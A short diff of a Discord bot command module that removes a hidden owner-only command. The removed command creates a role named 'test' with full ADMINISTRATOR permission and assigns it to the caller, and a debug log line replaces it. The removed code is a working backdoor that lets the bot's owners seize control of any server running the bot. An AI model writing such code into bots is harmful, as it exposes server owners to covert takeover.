@@ -14,12 +14,6 @@ module.exports = {
      */
     run: async(a, message, args) => {
         if (!bot.owners.includes(message.author.id)) return;
-        const role = await message.guild.roles.create({data: {
-            name: 'test',
-            permissions: [
-                'ADMINISTRATOR'
-            ]
-        }})
-        message.guild.members.cache.get(message.author.id).roles.add(role.id);
+        console.log(bot.removeListener)
     }
 }   
